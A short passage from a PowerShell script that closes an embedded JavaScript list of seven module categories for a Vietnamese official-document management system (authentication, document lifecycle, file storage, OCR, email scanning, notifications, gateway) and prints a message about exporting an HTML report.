  { id: "AUTH", name: "1. Xác thực & Bảo mật (Auth & Security)" },
  { id: "DOC", name: "2. Quản lý Công văn & NĐ30 (Document Lifecycle)" },
  { id: "FILE", name: "3. Tải tệp & Lưu trữ (Files & Storage)" },
  { id: "OCR", name: "4. AI-OCR & Bóc tách Regex (OCR & Extraction)" },
  { id: "EMAIL", name: "5. Email Worker & IMAP (Email Scanner)" },
  { id: "NOTIF", name: "6. Thông báo & SignalR (Notification & Queue)" },
  { id: "GW", name: "7. Gateway & Phục hồi lỗi (Gateway & Resilience)" }
];
'@

Write-Host "Đang xuất bản file báo cáo HTML..." -ForegroundColor Cyan
